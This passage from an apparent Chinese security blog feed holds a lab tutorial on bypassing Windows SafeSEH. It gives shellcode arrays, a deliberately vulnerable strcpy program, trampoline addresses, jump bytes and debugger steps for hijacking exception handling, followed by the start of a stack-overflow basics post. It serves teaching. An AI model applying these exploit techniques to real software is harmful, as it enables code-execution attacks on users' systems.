class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）用 VC++ 6 .0 编译一个不使用 SafeSEH 的动态链接库 SEH_NOSafeSEH_JUMP.DLL，然后由启用 SafeSEH 的应用程序 SEH_NOSafeSEH.EXE 去加载它。<br>（ 2）SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）使用 SEH_NOSafeSEH_JUMP.DLL 中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，让程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：将 dll 基址设置为 0x11120000 是为了防止“ pop pop retn”指令地址中存在 0x00。<br>如果以 VC++ 6.0 的默认加载基址 0x10000000 为 DLL 的加载基址，DLL 中的 “pop pop retn” 指令地址可能会包含 0x00，这会导致我们在进行 strcpy 操作时会将字符串截断影响 shellcode 的复制。</p></blockquote><p>注意：记得禁用优化选项，Project --&gt; Properties --&gt; Configuration Properties --&gt; C/C++ --&gt; Optimization --&gt;  Optimization 选择 Disabled</p><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h2><p>（ 1）编译一个不启用 SafeSEH 的 DLL</p><ol><li>在VC++ 6.0 中建立一个 Win32 的动态链接库，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606150709169.png" alt="image-20220606150709169"></p><ol start="2"><li>重新设置基址，在顶部菜单中选择 “工程 —&gt; 设置”，然后切换到 ”连接“ 选项卡，在 “工程选项“ 的输入框中添加 ” /base:“0x11120000” “即可，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606151129127.png" alt="image-20220606151129127"></p><ol start="3"><li>编译好后，将 SEH_NOSafeSEH_JUMP.DLL 复制到与 SEH_NOSafeSEH.EXE 相同目录下。</li></ol><p>（ 2）分析要溢出的主程序</p><ol><li>添加 INT 3中断，然后通过 OllySSEH 插件查看加载模块的 SafeSEH 情况。</li></ol><blockquote><p>插件下载地址：(<a href="https://bbs.pediy.com/thread-45544.htm">https://bbs.pediy.com/thread-45544.htm</a>)<br>OllySSEH 对于 SafeSEH 的描述：<br>（1） /SafeSEH OFF，未启用 SafeSEH，这种模块可以作为跳板。</p><p>（2） /SafeSEH ON，启用 SafeSEH，可以使用右键点击查看 S.E.H 注册情况。</p><p>（3） No SEH，不支持 SafeSEH，即 IMAGE_DLLCHARACTERISTICS_ NO_SEH 标志位被设置，模块内的异常会被忽略，所以不能作为跳板。</p><p>（4） Error，读取错误</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171712911.png" alt="image-20220606171712911"></p><p>查看结果，如下图所示。主程序 SEH_NOSafeSEH.EXE 中启用了 SafeSEH，但是它里面的模块SEH_NOSafeSEH_JUMP.DLL 未启用 SafeSEH，我们可以利用这个 DLL 中的 ”pop pop retn“ 指令作为跳板来绕过 SafeSEH。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171616216.png" alt="image-20220606171616216"></p><p>（ 3）确定跳板地址</p><p>转到 0x11120000 中右击，查找 --&gt; 命令序列<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606172452434.png" alt="image-20220606172452434"></p><p>在命令序列框中输入下图命令，查找它</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211412069.png" alt="image-20220608211412069"></p><p>然后我们就找到了在DLL中的 “pop eax pop eax retn”，位于 0x11121068 处，如下图<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211446531.png" alt="image-20220608211446531"></p><p>（ 4）构造 shellcode</p><ol><li>计算被溢出字符串到最近的异常处理函数指针的距离。<br>先将 shellcode 赋值为 0x90 串，长度小于 200 个字节，然后再 strcpy 操作结束后中断程序。<br>如下图，被溢出字符串起始位置为 0x0012FDB8</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608210733817.png" alt="image-20220608210733817"></p><p>​距离它最近的异常处理函数指针位于 0x0012FE90+4 位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608212431019.png" alt="image-20220608212431019"></p><p>由于这次使用的是 “pop pop retn” 指令序列，所以我们要将弹出 “failwest” 对话框的机器码放到 shellcode 的后半部分。（避免未命中）</p><blockquote><p>注意：经过 VS 2008 编译的程序，在进入含有__try{}的函数时会在 Security Cookie+4 的位置压入-2（ VC++ 6.0 下为-1），在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。</p><p>例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成 0，进入第二个的时候被修改为 1。如果在__try{}块中<strong>出现了异常，程序会根据这个值调用相应的__except()处理</strong>，处理结束后这个位置的值会重新修改为-2；如里没有发生异常，程序在离开__try{}块时这个值也会被修改回-2。当然这个值在异常处理时还有其他用途，在这我们不过多介绍，有兴趣的话可以自己跟踪调试一下。我们只需要知道<strong>由于它的存在，我们的 shellcode 可能会被破坏。</strong></p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608214503431.png" alt="image-20220608214503431"></p><p>为了避免shellcode 关键部分被破坏，我们采用一下布局：shellcode 最开始部分为 220 个字节的 0x90 填充；在 221~224 位置用跳板地址 0x11121068 覆盖；然后再跟上 8 个字节的 0x90 填充；最后附上弹出 “ failwest” 对话框的机器码。这样就可以保证弹出对话框的机器码不被破坏了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608220337220.png" alt="image-20220608220337220"></p><blockquote><p>题外话： 在实际的溢出过程中由于条件限制和未知因素， shellcode 有时会被破坏，出现这种情况时可以尝试不同的 shellcode 布局，使用不同的跳转指令，以避开这些破坏。</p></blockquote><p>（ 5）调试运行</p><ol><li>将上面的 shellcode 布置好后，编译运行程序，用 OllyDbg 调试程序，在 0x11121068 处下断点，让程序继续运行。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609143555512.png" alt="image-20220609143555512"></p><ol start="2"><li>我们将会看到，程序停在 0x11121068 处，说明我们已经进入DLL 绕过 SafeSEH，成功劫持程序流程了，如下图。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144122991.png" alt="image-20220609144122991"></p><ol start="3"><li>继续单步执行，我们将会看到从 0x0012FE90 到 0x0012FEA0 中有一些未知命令，分别是我们用来覆盖异常函数指针的跳板地址和进入__try{}块时被赋值为 0 的部分。本实验中它们对实验结果没有影响，如果有影响，就要用向后跳转指令，跳过影响指令，直接进入关键部分。</li></ol><blockquote><p>可以尝试将 shellcode 中的 217~220 字节用 0xEB0E9090 填充，执行后，他会跳过 shellcode 中间部分，直接运行到弹出对话框部分。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144659336.png" alt="image-20220609144659336"></p><ol start="4"><li>按F9继续执行，就能看到对话框了。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609151230429.png" alt="image-20220609151230429"></p><h1 id="利用加载模块之外的地址绕过-safeseh"><a class="markdownIt-Anchor" href="#利用加载模块之外的地址绕过-safeseh"></a> 利用加载模块之外的地址绕过 SafeSEH</h1><p>在前面我们讲过，SafeSEH 只检查异常处理函数指针是否指向栈中地址，对于指向其它地址它是不对其进行有效性验证的。所以我们可以让异常处理函数指针指向非栈地址，进而就能绕过 SafeSEH 检验。</p><p>然而当程序加载到内存中后，在它所占的整个内存空间中，除了我们平时常见的 PE 文件模块（ EXE 和 DLL）外，还有其他一些映射文件（我们可以通过 OllyDbg 的“view→memory”查看程序的内存映射状态）。例如下图中的 map类型，如果我们能在这些文件中找到跳转指令的话就可以绕过 SafeSEH，而这样的指令也确实存在。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609163404514.png" alt="image-20220609163404514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">跳板指令：</span><br><span class="line">除了前面的 pop eax pop eax retn 外，还有以下指令</span><br><span class="line">call/jmp dword ptr[esp+0x8]</span><br><span class="line">call/jmp dword ptr[esp+0x14]</span><br><span class="line">call/jmp dword ptr[esp+0x1c]</span><br><span class="line">call/jmp dword ptr[esp+0x2c]</span><br><span class="line">call/jmp dword ptr[esp+0x44]</span><br><span class="line">call/jmp dword ptr[esp+0x50]</span><br><span class="line">call/jmp dword ptr[ebp+0xc]</span><br><span class="line">call/jmp dword ptr[ebp+0x24]</span><br><span class="line">call/jmp dword ptr[ebp+0x30]</span><br><span class="line">call/jmp dword ptr[ebp-0x4]</span><br><span class="line">call/jmp dword ptr[ebp-0xc]</span><br><span class="line">call/jmp dword ptr[ebp-0x18]</span><br></pre></td></tr></table></figure><p>只要找到一条指令就能绕过 SafeSEH 了。我们通过下面的程序来演示和分析如何在所有加载模块都开启 SafeSEH 机制的情况下绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x2B\xFF\xFF\xFF\x90\x90\x90&quot;</span><span class="comment">// far jump and \x90</span></span><br><span class="line"><span class="string">&quot;\xEB\xF6\x90\x90&quot;</span><span class="comment">// short jump and \x90</span></span><br><span class="line"><span class="string">&quot;\x0B\x0B\x29\x00&quot;</span><span class="comment">// address of call [ebp+30] in outside memory</span></span><br><span class="line">;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1） Test 函数中通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 2）该程序中所有加载模块都启用了 SafeSEH 机制，故我们不能通过未启用 SafeSEH 的模块还绕过 SafeSEH 了。<br>（ 3）将异常处理函数指针覆盖为加载模块外的地址来实现对 SafeSEH 的绕过，然后通过除 0 触发异常将程序转入异常处理，进而劫持程序流程。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00290B0B 为 Windows XP SP3 下的跳板地址，如果您在其他操作系统下测试，该地址可能需要重新设置。</p></blockquote><p>实验步骤：</p><p>（ 1）分析程序，先将 shellcode 填充为多个 0x90（长度不超过200个），然后编译运行程序。<br>在 Ollydbg 中用 OllySEH 插件分析加载模块的 SafeSEH 情况，如下图，可以看到，所有加载模块都没有 /SafeSEH OFF 状态。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170143708.png" alt="image-20220609170143708"></p><p>（ 2）在加载模块内存之外<strong>寻找合适的跳板</strong>绕过 SafeSEH。</p><ol><li>接下来需要使用 OllyFindAddr 插件，它能在整个程序的内存空间搜索指令。OllyFindAddr下载地址：<a href="https://bbs.pediy.com/thread-198080.htm">https://bbs.pediy.com/thread-198080.htm</a></li><li>使用 call/jmp dword ptr[ebp+n]指令作为跳板。插件 —&gt; OllyFindAddr —&gt; Overflow return address —&gt; Find CALL/JMP [EBP+N]</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170723023.png" alt="image-20220609170723023"></p><ol start="3"><li>在日志中查看搜索结果。Module：Unknown，就是加载模块之外的指令，将 0x00280B0B 作为跳板。</li></ol><blockquote><p>如果不确定，也可以将它与加载模块逐一比对。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609171116159.png" alt="image-20220609171116159"></p><p>（ 3）消除异常。如果直接用 0x00280B0B 构造 shellcode，那shellcode 可能会被它中的0x00截断，所以我们要将跳板放在shellcode的最后，防止其造成异常。</p><p>通过前面利用未启用 SafeSEH 模块绕过 SafeSEH，我们知道通过跳板指令转入 shellcode 后首先是4个字节的 0x90 的填充，所以我们可以利用这4个字节来跳转到 shellcode，而前面提到的 0xEB0E9090，其实 0xEB0E 是向前跳转 0x0E 的机器码，可以把它放在这4字节中，但由于1个字节的操作数向前回跳的范围有限，不足以跳转到shellcode 的起始地址，所以我们用两次跳转来完成跳跃。</p><p><strong>部署两个跳板</strong>，在刚刚的 4个字节中部署短跳转指令 0xEBF6 向前回跳 8个字节。（JMP 指令用相对地址跳转时，是以 JMP 下一条指令的地址为基准，所以实际上是向后跳转10个字节）在这 8个字节中再布置一条 5字节的长跳转指令，跳转到 shellcode 的起始部分。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609174416604.png" alt="image-20220609174416604"></p><p>（ 4）构造 shellcode</p><ol><li>确定 shellcode 起始地址到长跳转指令之间的距离。</li></ol><p>本实验中，被溢出字符串起始位置为 0x0012FE88，距离最近 SEH地址为 0x0012FF60，部署长跳转指令位于 0x0012FF58，所以我们需要回跳 213 个字节（包含长跳转指令的 5 个字节），使用 E92BFFFFFF（跳转 0xFFFFFF2B 个字节）填充长跳位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609175749949.png" alt="image-20220609175749949"></p><p>除 0 异常后，最近SEH 地址为0x0012FF60</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609180802012.png" alt="image-20220609180802012"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609182557595.png" alt="image-20220609182557595"></p><ol start="2"><li>部署 shellcode</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609183731968.png" alt="image-20220609183731968"></p><p>（ 5）运行验证，对话框弹出</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609184806753.png" alt="image-20220609184806753"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;safeseh-对异常处理的保护原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#safeseh-对异常处理的保护原理&quot;&gt;&lt;/a&gt; SafeSEH 对异常处理的保护原理&lt;/h1&gt;
&lt;h2 id=&quot;safeseh的原理&quot;&gt;&lt;a clas</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SafeSEH" scheme="https://www.rgzzplus.com/tags/SafeSEH/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出</title>
    <link href="https://www.rgzzplus.com/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://www.rgzzplus.com/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2022-06-05T08:49:28.000Z</published>
    <updated>2022-06-05T08:50:26.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="二进制文件概述"><a class="markdownIt-Anchor" href="#二进制文件概述"></a> 二进制文件概述</h2><h3 id="pe文件格式"><a class="markdownIt-Anchor" href="#pe文件格式"></a> PE文件格式</h3><p>PE（Portable Executable）是 Win32 平台下的可执行文件（如：&quot;*.exe&quot;,&quot;*.dll&quot;)，PE文件规定了所有信息（二进制机器代码、字符串、菜单、图标、位图、字体等）在可执行文件中如何组织。</p><p>PE 文件格式把可执行文件分成若干个数据节（section）：</p><ul><li>.text    二进制的机器代码</li><li>.data    初始化的数据块</li><li>.idata    动态链接库</li><li>.rsrc    程序的资源</li></ul><h1 id="系统栈的工作原理"><a class="markdownIt-Anchor" href="#系统栈的工作原理"></a> 系统栈的工作原理</h1><h2 id="内存的不同用途"><a class="markdownIt-Anchor" href="#内存的不同用途"></a> 内存的不同用途</h2><p>缓冲区溢出：大缓冲区向小缓冲区复制，撑爆了小缓冲区，从而冲掉了和小缓冲区相邻内存区域的其它数据而引起的内存问题。</p><p>进程使用的内存划分：</p><ol><li>代码区</li><li>数据区</li><li>堆区</li><li>栈区</li></ol><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519164948399.png" alt="image-20220519164948399"></p><h2 id="函数调用过程"><a class="markdownIt-Anchor" href="#函数调用过程"></a> 函数调用过程</h2><p>同一文件不同函数的代码在内存代码区中是散乱无关的，但都在同一个 PE 文件的代码所映射的一个 “节” 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">intfunc_B(<span class="type">int</span> arg_B1, <span class="type">int</span> arg_B2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_B1, var_B2;</span><br><span class="line">    var_B1=arg_B1+arg_B2;</span><br><span class="line">    var_B2=arg_B1-arg_B2;</span><br><span class="line">    <span class="keyword">return</span> var_B1*var_B2;</span><br><span class="line">&#125;</span><br><span class="line">intfunc_A(<span class="type">int</span> arg_A1, <span class="type">int</span> arg_A2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_A;</span><br><span class="line">    var_A = func_B(arg_A1,arg_A2) + arg_A1;</span><br><span class="line">    <span class="keyword">return</span> var_A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_main;</span><br><span class="line">    var_main=func_A(<span class="number">4</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> var_main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧的内存空间被它所属的函数独占。当函数返回时，系统栈会弹出该函数所对应的栈帧。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221193711651.png" alt="image-20220221193711651"></p><p>函数调用时，栈中的变化：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519170737556.png" alt="image-20220519170737556"></p><h2 id="函数调用相关约定"><a class="markdownIt-Anchor" href="#函数调用相关约定"></a> 函数调用相关约定</h2><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519171050801.png" alt="image-20220519171050801"></p><p>如果要明确使用某一种调用约定，在函数前加上调用约定的声名即可。默认调用是__stdcall 调用方式，从右向左将参数入栈。</p><blockquote><p>特例：C++类成员中的 this 指针，一般用 ECX 寄存器传递。用GCC编译器编译，他会作为最后一个参数压栈。</p></blockquote><p><strong>函数调用步骤：</strong></p><ol><li>参数入栈</li><li>返回地址入栈</li><li>代码区跳转</li><li>栈帧调整：<br>保存当前栈帧状态值，已备后面恢复本栈帧时使用（ EBP 入栈）；<br>将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；<br>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）；</li></ol><p>__stdcall 调用约定，函数调用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;调用前</span><br><span class="line">push 参数 3 ;假设该函数有 3 个参数，将从右向左依次入栈</span><br><span class="line">push 参数 2</span><br><span class="line">push 参数 1</span><br><span class="line">call 函数地址;call 指令将同时完成两项工作： </span><br><span class="line">;a）向栈中压入当前指令在内存中的位置，即保存返回地址。 </span><br><span class="line">;b）跳转到所调用函数的入口地址函数入口处</span><br><span class="line">push ebp ;保存旧栈帧的底部</span><br><span class="line">mov ebp, esp ;设置新栈帧的底部（栈帧切换）</span><br><span class="line">sub esp, xxx ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</span><br></pre></td></tr></table></figure><p><strong>函数返回的步骤：</strong></p><ol><li><p>保存返回值：通常保存在 EAX 中。</p></li><li><p>弹出当前栈帧，恢复上一个栈帧。<br>具体操作：</p><ol><li>在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间</li><li>将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。</li><li>将函数返回地址弹给 EIP 寄存器。</li></ol><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519172202601.png" alt="image-20220519172202601"></p></li><li><p>跳转</p></li></ol><p>函数返回时，相关指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 